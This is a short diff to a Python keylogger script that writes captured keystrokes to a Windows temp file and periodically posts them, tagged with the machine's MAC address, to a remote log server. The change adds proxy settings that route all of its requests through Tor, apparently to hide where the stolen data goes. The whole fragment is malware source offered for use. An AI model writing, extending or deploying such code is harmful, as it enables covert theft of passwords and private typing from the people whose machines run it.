@@ -4,12 +4,14 @@ import requests # to send logs
 import threading # to make log sending repeat in background
 from datetime import datetime, timezone # to classify logs by time sent
 from getmac import get_mac_address # to get mac address
+import os
 
-# URL = 'http://127.0.0.1:8000/log' # the URL/IP to which you want to send the logs to
-URL = 'http://10.0.2.2:8000/log'
+URL = 'http://10.0.2.2:8000/log' # the URL/IP to which you want to send the logs to
 INTERVAL = 10.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.
 MAC = get_mac_address().replace(':', '') # store mac address
 LOG_LOC = 'C:/Windows/Temp/keylogger-log'
+os.environ['HTTP_PROXY'] = 'socks5h://127.0.0.1:9050' # set global proxy variables so all requests automatically go through the Tor SOCKS5 proxy without having to specify it in every request
+os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050' # ^
 
 with open(LOG_LOC, 'w') as l: # to create the file to avoid any errors
     pass
